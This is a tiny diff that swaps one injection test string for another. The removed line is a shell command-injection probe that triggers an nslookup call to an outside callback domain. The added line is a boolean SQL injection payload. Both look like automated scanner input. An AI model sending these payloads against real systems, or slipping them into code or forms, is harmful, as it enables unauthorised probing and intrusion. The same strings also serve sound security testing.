@@ -1,1 +1,1 @@
-&nslookup -q=cname hitnadfbdhglr2a95a.bxss.me&'\"`0&nslookup -q=cname hitnadfbdhglr2a95a.bxss.me&`'
+-1' OR 3+978-978-1=0+0+0+1 or 'WegQrscX'='
